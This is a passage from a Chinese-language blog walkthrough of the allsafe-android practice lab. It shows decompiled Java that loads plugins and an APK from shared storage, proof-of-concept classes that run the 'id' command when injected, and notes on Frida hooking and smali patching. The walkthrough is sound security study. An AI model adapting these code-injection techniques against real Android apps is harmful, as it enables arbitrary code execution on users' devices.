class="hljs-keyword">for</span> (PackageInfo packageInfo : getPackageManager().getInstalledPackages(<span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> packageInfo.packageName;<br>            Intrinsics.checkNotNullExpressionValue(packageName, <span class="hljs-string">&quot;packageName&quot;</span>);<br>            <span class="hljs-keyword">if</span> (StringsKt.startsWith$<span class="hljs-keyword">default</span>(packageName, <span class="hljs-string">&quot;infosecadventures.allsafe&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">2</span>, (Object) <span class="hljs-literal">null</span>)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Context</span> <span class="hljs-variable">packageContext</span> <span class="hljs-operator">=</span> createPackageContext(packageName, <span class="hljs-number">3</span>);<br>                    packageContext.getClassLoader().loadClass(<span class="hljs-string">&quot;infosecadventures.allsafe.plugin.Loader&quot;</span>).getMethod(<span class="hljs-string">&quot;loadPlugin&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]).invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeUpdate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/sdcard/&quot;</span> + Environment.DIRECTORY_DOWNLOADS + <span class="hljs-string">&quot;/allsafe_updater.apk&quot;</span>);<br>            <span class="hljs-keyword">if</span> (file.exists() &amp;&amp; file.isFile()) &#123;<br>                <span class="hljs-type">DexClassLoader</span> <span class="hljs-variable">dexClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexClassLoader</span>(file.getAbsolutePath(), getCacheDir().getAbsolutePath(), <span class="hljs-literal">null</span>, getClassLoader());<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">objInvoke</span> <span class="hljs-operator">=</span> dexClassLoader.loadClass(<span class="hljs-string">&quot;infosecadventures.allsafe.updater.VersionCheck&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getLatestVersion&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]).invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>                Intrinsics.checkNotNull(objInvoke, <span class="hljs-string">&quot;null cannot be cast to non-null type kotlin.Int&quot;</span>);<br>                <span class="hljs-type">int</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> ((Integer) objInvoke).intValue();<br>                <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &lt; version) &#123;<br>                    Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Update required!&quot;</span>, <span class="hljs-number">1</span>).show();<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> infosecadventures.allsafe.plugin;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> androidx.annotation.Nullable;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Loader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadPlugin</span><span class="hljs-params">()</span>&#123;<br>        Log.d(<span class="hljs-string">&quot;exec123456789&quot;</span>, <span class="hljs-string">&quot;=======================================================&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Log.d(<span class="hljs-string">&quot;exec1234567890&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(Runtime.getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758808834690-f0e4a781-893c-4b4b-bfce-5a25c928b136.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.updater;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> androidx.annotation.Nullable;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionCheck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getLatestVersion</span><span class="hljs-params">()</span>&#123;<br>        Log.d(<span class="hljs-string">&quot;exec1234567890&quot;</span>, <span class="hljs-string">&quot;=========================================&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            Log.d(<span class="hljs-string">&quot;exec1234567890&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(Runtime.getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758810190634-af11390a-e555-4958-8779-8d376083a7df.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="17-2-漏洞总结"><a href="#17-2-漏洞总结" class="headerlink" title="17.2 漏洞总结"></a>17.2 漏洞总结</h2><p>额，没啥好说的。</p>
+<h1 id="18-Native-Library-本地库"><a href="#18-Native-Library-本地库" class="headerlink" title="18 Native Library(本地库)"></a>18 Native Library(本地库)</h1><p>就这样 frida 在那样 hook，就可以辣。</p>
+<p>步骤一样，只不过变成了 hook 本地 so 文件了而已；</p>
+<h1 id="19-Smali-Patching-Smali-补丁"><a href="#19-Smali-Patching-Smali-补丁" class="headerlink" title="19 Smali Patching(Smali 补丁)"></a>19 Smali Patching(Smali 补丁)</h1><p>根据题目要求需要让以后的判断成立即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758810979809-e689ec04-5a68-40f5-8cdc-0b6609864250.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758811796726-01570af2-1970-49c2-90a8-265dc666bfce.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/t0thkr1s/allsafe-android">https://github.com/t0thkr1s/allsafe-android</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16361">https://xz.aliyun.com/news/16361</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Siestazzz/p/18889662">https://www.cnblogs.com/Siestazzz/p/18889662</a></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="category-chain-item">攻防渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+        <a href="/tags/APK/" class="print-no-link">#APK</a>
+      
+        <a href="/tags/app/" class="print-no-link">#app</a>
+      
+        <a href="/tags/%E9%80%86%E5%90%91/" class="print-no-link">#逆向</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>allsafe-android靶场</div>
+      <div>http://candyb0x.github.io/2025/09/27/allsafe-android靶场/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月27日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/09/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0Callbacks/" title="回调函数Callbacks">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">回调函数Callbacks</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/02/Spectre-BHI-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="Spectre-BHI 漏洞复现分析">
+                        <span class="hidden-mobile">Spectre-BHI 漏洞复现分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
